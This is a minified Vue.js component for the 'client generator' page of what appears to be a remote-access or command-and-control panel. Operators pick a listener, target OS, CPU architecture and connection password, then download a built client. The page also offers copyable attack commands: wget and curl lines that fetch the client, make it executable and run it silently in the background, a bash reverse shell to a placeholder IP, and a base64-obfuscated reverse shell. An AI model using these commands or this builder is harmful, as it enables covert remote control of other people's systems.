import{_ as de}from"./f5f6aa45.js";/* empty css        *//* empty css        */import"./4ed993c7.js";/* empty css        *//* empty css        *//* empty css        */import{o as w,a as _,d as re,x as _e,a2 as pe,O as ue,N as me,v as he,y as fe,P as ve,z as xe,a3 as q,q as ge,n as Z,a4 as we,Z as ye,D as be,a5 as B,$ as Ce,a6 as J,a7 as ke,a8 as Se,a9 as Me,s as Ee,aa as Ae}from"./3325456c.js";import{C as W}from"./59206fab.js";import{H as Ie,r as y,_ as Ve,e as v,d as ze,l as d,m,p as e,V as t,P as o,u as i,U as r,T as L,F as b,a8 as C,K as Oe,S as P,O as k,J as S,R as Y,az as $e,aA as Be}from"./95bbca75.js";const p=x=>($e("data-v-8de4a16e"),x=x(),Be(),x),Le={class:"client-generator"},Pe={class:"header-section"},Re=p(()=>e("div",{class:"header-content"},[e("h1",{class:"page-title"},"客户端生成"),e("p",{class:"page-subtitle"},"配置并生成适用于不同系统的远程客户端")],-1)),De={class:"header-stats"},Te={class:"stat-item"},Ue={class:"stat-info"},je={class:"stat-value"},Ne=p(()=>e("div",{class:"stat-label"},"支持平台",-1)),Fe={class:"stat-item"},Ge={class:"stat-info"},qe={class:"stat-value"},Ze=p(()=>e("div",{class:"stat-label"},"架构类型",-1)),Je={class:"card-header"},We={class:"header-left"},Ye=p(()=>e("h3",{class:"card-title"},"生成配置",-1)),He={class:"header-right"},Ke={class:"config-form"},Qe={class:"listener-option"},Xe={class:"option-label"},es=p(()=>e("div",{class:"empty-option"},"暂无可用监听器",-1)),ss=p(()=>e("div",{class:"form-hint"},"选择客户端连接的监听器地址",-1)),ts={class:"os-selector"},as=["onClick"],os={class:"os-icon-wrapper"},ns={class:"os-info"},ls={class:"os-name"},cs={class:"os-arch-count"},is={class:"arch-grid"},ds=["onClick"],rs={class:"arch-icon"},_s={class:"arch-info"},ps={class:"arch-name"},us={class:"arch-desc"},ms=p(()=>e("div",{class:"form-hint"},"根据目标系统选择合适的处理器架构",-1)),hs={class:"password-input-wrapper"},fs=p(()=>e("div",{class:"form-hint"},"客户端连接时使用的验证密码（可选，8-32位字符）",-1)),vs={key:0,class:"password-strength"},xs={class:"strength-meter"},gs={class:"strength-text"},ws={key:0,class:"form-hint"},ys={class:"card-header"},bs={class:"header-left"},Cs=p(()=>e("h3",{class:"card-title"},"使用命令参考",-1)),ks={class:"header-right"},Ss={class:"commands-grid"},Ms={class:"command-header"},Es={class:"command-type"},As={class:"type-name"},Is={class:"command-content"},Vs={class:"command-code"},zs={class:"command-desc"},Os=Ie({__name:"ServerGen",setup(x){const R=[{label:"Windows",value:"windows",icon:w},{label:"Linux",value:"linux",icon:w},{label:"macOS",value:"darwin",icon:w}],M={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},H={amd64:"64位 x86 架构 (Intel/AMD)",386:"32位 x86 架构",arm:"ARM 架构 (32位)",arm64:"ARM 64位架构",loong64:"龙芯架构",mips:"MIPS 架构 (大端)",mipsle:"MIPS 架构 (小端)",mips64:"MIPS 64位 (大端)",mips64le:"MIPS 64位 (小端)"},E=y([]),A=y(!1),I=y(!1),a=Ve({listener:"",os:"",arch:"",pass:""}),D=y([]),K=v(()=>R.length),Q=v(()=>{let s=0;return Object.values(M).forEach(c=>s+=c.length),s}),V=v(()=>a.listener&&a.os&&a.arch),T=v(()=>{if(!a.pass)return 0;let s=0;return a.pass.length>=8&&(s+=20),a.pass.length>=12&&(s+=20),/[a-z]/.test(a.pass)&&(s+=20),/[A-Z]/.test(a.pass)&&(s+=20),/[0-9]/.test(a.pass)&&(s+=20),/[^a-zA-Z0-9]/.test(a.pass)&&(s+=20),Math.min(s,100)}),X=v(()=>{const s=T.value;return s<=40?"弱":s<=70?"中":"强"}),U=[{name:"直接运行",code:"./r_linux_amd64 [上线密码]",description:"直接运行客户端程序",icon:ke},{name:"Wget下载",code:"wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &",description:"使用 wget 下载并运行",icon:B},{name:"Curl下载",code:"curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [上线密码] > m.log 2>&1 &",description:"使用 curl 下载并运行",icon:B},{name:"Bash反弹",code:"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1",description:"Bash 反弹 Shell",icon:Se},{name:"Base64反弹",code:"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}",description:"Base64 编码的反弹 Shell",icon:Me},{name:"后台运行",code:"nohup ./client [密码] > /dev/null 2>&1 &",description:"在后台静默运行客户端",icon:Ee}],ee=s=>H[s]||"未知架构",j=()=>{if(!a.os||!a.arch)return"";let s=`r_${a.os}_${a.arch}`;return a.os==="windows"&&(s+=".exe"),s},se=async s=>{var c;if(s&&E.value.length===0){A.value=!0;try{const l=await W.ShowListener();l.status===200&&l.data.status===200?E.value=l.data.data:_.error(((c=l.data)==null?void 0:c.data)||"获取监听器列表失败")}catch(l){console.error("获取监听器失败:",l),_.error("获取监听器列表失败")}finally{A.value=!1}}},N=s=>{a.os=s,a.arch="",D.value=M[s]||[]},te=s=>{a.arch=s},ae=()=>{const s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";let c="";for(let l=0;l<16;l++)c+=s.charAt(Math.floor(Math.random()*s.length));a.pass=c,_.success("已生成随机密码")},oe=async()=>{if(!V.value){_.warning("请填写完整的配置信息");return}I.value=!0;try{const s=await W.GenServer({osType:a.os,archType:a.arch,listener:a.listener,pass:a.pass});if(s.status===200){const c=s.headers["content-disposition"]||"",l=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(c);let z=l&&l.length>1?decodeURIComponent(l[1].replace(/['"]/g,"")):j();const O=new Blob([s.data],{type:s.headers["content-type"]}),h=document.createElement("a"),u=window.URL.createObjectURL(O);h.href=u,h.download=z,document.body.appendChild(h),h.click(),document.body.removeChild(h),window.URL.revokeObjectURL(u),_.success("客户端生成成功，开始下载")}else _.error("生成失败，请稍后重试")}catch(s){console.error("生成失败:",s),_.error(s.message||"生成客户端失败")}finally{I.value=!1}},F=s=>{navigator.clipboard.writeText(s).then(()=>{_.success("命令已复制到剪贴板")}).catch(()=>{_.error("复制失败，请手动复制")})},ne=()=>{const s=U.map(c=>`# ${c.name}
${c.code}
`).join(`
`);F(s)};return ze(()=>{N("windows")}),(s,c)=>{const l=re,z=_e,O=Ae,h=pe,u=ue,le=me,g=he,$=fe,ce=ve,G=xe;return d(),m("div",Le,[e("div",Pe,[Re,e("div",De,[e("div",Te,[t(l,{class:"stat-icon platform-icon"},{default:o(()=>[t(i(w))]),_:1}),e("div",Ue,[e("div",je,r(K.value),1),Ne])]),e("div",Fe,[t(l,{class:"stat-icon arch-icon"},{default:o(()=>[t(i(q))]),_:1}),e("div",Ge,[e("div",qe,r(Q.value),1),Ze])])])]),t(G,{class:"config-card",shadow:"hover"},{header:o(()=>[e("div",Je,[e("div",We,[t(l,{class:"card-icon"},{default:o(()=>[t(i(ge))]),_:1}),Ye]),e("div",He,[t(z,{type:"success",size:"small"},{default:o(()=>[L("实时生成")]),_:1})])])]),default:o(()=>[e("div",Ke,[t(ce,{model:a,"label-position":"top",class:"generator-form"},{default:o(()=>[t(u,{label:"监听器",required:""},{default:o(()=>[t(h,{modelValue:a.listener,"onUpdate:modelValue":c[0]||(c[0]=n=>a.listener=n),placeholder:"选择监听器",class:"form-select",onVisibleChange:se,loading:A.value,clearable:"",filterable:""},{prefix:o(()=>[t(l,null,{default:o(()=>[t(i(Z))]),_:1})]),empty:o(()=>[es]),default:o(()=>[(d(!0),m(b,null,C(E.value,n=>(d(),k(O,{key:n,label:n,value:n},{default:o(()=>[e("div",Qe,[t(l,{class:"option-icon"},{default:o(()=>[t(i(Z))]),_:1}),e("span",Xe,r(n),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue","loading"]),ss]),_:1}),t(u,{label:"操作系统",required:""},{default:o(()=>[e("div",ts,[(d(),m(b,null,C(R,n=>{var f;return e("div",{key:n.value,class:S(["os-option",{"os-selected":a.os===n.value}]),onClick:ie=>N(n.value)},[e("div",os,[t(l,{class:S(["os-icon",`os-${n.value}`])},{default:o(()=>[(d(),k(Y(n.icon)))]),_:2},1032,["class"])]),e("div",ns,[e("div",ls,r(n.label),1),e("div",cs,r(((f=M[n.value])==null?void 0:f.length)||0)+" 种架构 ",1)]),a.os===n.value?(d(),k(l,{key:0,class:"os-check"},{default:o(()=>[t(i(we))]),_:1})):P("",!0)],10,as)}),64))])]),_:1}),t(u,{label:"系统架构",required:""},{default:o(()=>[e("div",is,[(d(!0),m(b,null,C(D.value,n=>(d(),m("div",{key:n,class:S(["arch-option",{"arch-selected":a.arch===n,"arch-disabled":!a.os}]),onClick:f=>a.os&&te(n)},[e("div",rs,[t(l,{class:"arch-icon-svg"},{default:o(()=>[t(i(q))]),_:1})]),e("div",_s,[e("div",ps,r(n.toUpperCase()),1),e("div",us,r(ee(n)),1)])],10,ds))),128))]),ms]),_:1}),t(u,{label:"连接密码"},{default:o(()=>[e("div",hs,[t(le,{modelValue:a.pass,"onUpdate:modelValue":c[1]||(c[1]=n=>a.pass=n),placeholder:"输入客户端连接密码",type:"password","show-password":"",clearable:"",class:"password-input",maxlength:32},{prefix:o(()=>[t(l,null,{default:o(()=>[t(i(ye))]),_:1})]),_:1},8,["modelValue"]),t($,{content:"生成随机密码",placement:"top"},{default:o(()=>[t(g,{class:"generate-password-btn",onClick:ae,icon:i(be),circle:"",size:"small"},null,8,["icon"])]),_:1})]),fs,a.pass?(d(),m("div",vs,[e("div",xs,[e("div",{class:"strength-bar",style:Oe({width:`${T.value}%`})},null,4)]),e("span",gs,"密码强度："+r(X.value),1)])):P("",!0)]),_:1}),t(u,null,{default:o(()=>[t(g,{type:"primary",onClick:oe,disabled:!V.value,loading:I.value,class:"generate-btn",size:"large"},{default:o(()=>[t(l,null,{default:o(()=>[t(i(B))]),_:1}),L(" 生成客户端 ")]),_:1},8,["disabled","loading"]),V.value?(d(),m("div",ws," 将生成 "+r(j())+" 客户端文件 ",1)):P("",!0)]),_:1})]),_:1},8,["model"])])]),_:1}),t(G,{class:"commands-card",shadow:"hover"},{header:o(()=>[e("div",ys,[e("div",bs,[t(l,{class:"card-icon"},{default:o(()=>[t(i(Ce))]),_:1}),Cs]),e("div",ks,[t($,{content:"复制所有命令",placement:"top"},{default:o(()=>[t(g,{type:"info",size:"small",icon:i(J),onClick:ne},{default:o(()=>[L(" 一键复制 ")]),_:1},8,["icon"])]),_:1})])])]),default:o(()=>[e("div",Ss,[(d(),m(b,null,C(U,(n,f)=>e("div",{key:f,class:S(["command-card",`command-type-${f%4}`])},[e("div",Ms,[e("div",Es,[t(l,{class:"type-icon"},{default:o(()=>[(d(),k(Y(n.icon)))]),_:2},1024),e("span",As,r(n.name),1)]),t($,{content:"复制命令",placement:"top"},{default:o(()=>[t(g,{type:"text",icon:i(J),onClick:ie=>F(n.code),class:"copy-btn"},null,8,["icon","onClick"])]),_:2},1024)]),e("div",Is,[e("pre",Vs,r(n.code),1),e("div",zs,r(n.description),1)])],2)),64))])]),_:1})])}}});const Fs=de(Os,[["__scopeId","data-v-8de4a16e"]]);export{Fs as default};
